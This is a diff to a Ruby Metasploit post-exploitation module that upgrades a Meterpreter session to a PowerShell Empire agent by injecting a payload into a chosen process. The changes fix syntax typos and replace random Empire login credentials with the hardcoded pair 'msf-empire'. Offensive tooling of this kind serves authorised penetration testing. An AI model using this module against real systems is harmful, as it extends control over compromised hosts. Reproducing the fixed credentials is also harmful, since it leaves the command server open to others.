@@ -8,11 +8,10 @@ require 'msf/core/empire_lib'
 require 'msf/core/Empire-UI'
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::ReflectiveDLLInjection
-  include Msf::Empire
   include Msf::EmpireUI
 
   def initialize(info={})
-    super(update_indo(info,
+    super(update_info(info,
                       "Name"                => "Upgrading to Empire from Meterpreter Post Module",
                       "Description"         => " This module will set up a bridge between the already existing meterpretr session and the Empire instance hosted over the port 1337. Please note that you need to have Empire Web-API preinstalled in your machine.",
                       "LICENSE"             => MSF_LICENSE,
@@ -20,18 +19,16 @@ class MetasploitModule < Msf::Post
                       "SessionTypes"        => ["meterpreter"],
                       "Author"              => ["author"]
                      ))
-    register_option(
+    register_options(
       [
-        OptPort.new('LPORT',[false, 'Port for payload to connect to, make sure port is not already in use', 7878 ])
+        OptPort.new('LPORT',[false, 'Port for payload to connect to, make sure port is not already in use', 7878 ]),
         OptString.new('PathToEmpire', [true, 'The Complete Path to Empire-Web API']),
-        OptInt.new('PID', [true, ,'Process Identifier to inject the Empire payload into'])
+        OptInt.new('PID', [true,'Process Identifier to inject the Empire payload into'])
       ])
   end
     #run method for when run command is issued
   def run
     print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
-    #Generating a random number to name the session attributes
-    rand_no = rand(1..10000)
     #Make sure that 1337 is not being used by another service
     command = "netstat -nlt | grep 1337"
     value = system(command)
@@ -42,12 +39,8 @@ class MetasploitModule < Msf::Post
     pid = datastore['PID'].to_i
     lport = datastore['LPORT'].to_s
 
-    #Getting username and passowrds for the current session
-    user_name = "user#{rand_no}"
-    user_pass = "pass#{rand_no}"
-
     #Initiating the Empire Instance thread with provided username and pass
-    command = "cd #{path} && ./empire --headless --username '#{user_name}' --password '#{user_pass}'"
+    command = "cd #{path} && ./empire --headless --username 'msf-empire' --password 'msf-empire'"
     print_status("Initiating Empire Web-API, this may take upto few seconds")
     server = Thread.new{
       value = system(command)
@@ -84,6 +77,5 @@ class MetasploitModule < Msf::Post
     ui_main(client_emp, agent_name)
   end
 end
-
 
 
